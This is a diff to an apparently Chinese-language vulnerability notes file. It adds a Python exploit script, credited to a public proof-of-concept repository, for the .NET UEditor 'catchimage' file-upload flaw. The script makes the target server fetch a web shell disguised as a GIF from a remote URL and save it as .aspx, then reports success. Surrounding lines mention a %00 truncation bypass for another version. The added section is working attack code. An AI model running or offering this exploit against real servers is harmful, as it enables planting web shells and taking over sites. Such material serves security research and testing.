@@ -228,6 +228,36 @@ GIF89a
 
 ![image](https://user-images.githubusercontent.com/84888757/161834354-f54bc939-4532-433a-a496-f3f1f8680af3.png)
 
+3、python exp
+来自[DawnFlam](https://github.com/DawnFlame/POChouse/tree/main/%5B%2B%5D%20%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E#net%E7%89%88-ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
+
+```
+import requests
+import re
+
+def upload():
+    url = 'http://www.test.com/ueditor/controller.ashx' # www.test.com/xxx/xxx/controller.ashx
+    photo_shell = 'http://www.test.com/1.gif' #photo_shell
+    headers = {
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
+        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+        'Accept-Encoding': 'gzip, deflate',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Upgrade-Insecure-Requests': '1'
+        }
+    req = requests.post(url=url+'?action=catchimage',headers=headers,data='source[]='+photo_shell+'?.aspx',verify=False)
+    
+    if re.search('SUCCESS',req.text):
+        print('[+] 上传成功！ 请查看响应包内容！')
+    else:
+        print('[-] 上传失败！ 请查看响应包内容！')
+    print(req.text)
+
+if __name__ == '__main__':
+    upload()
+```
+
 ### 4.2.3 ueditor.1.3.6 .net1版本
 使用%00截断的方式上传绕过
 
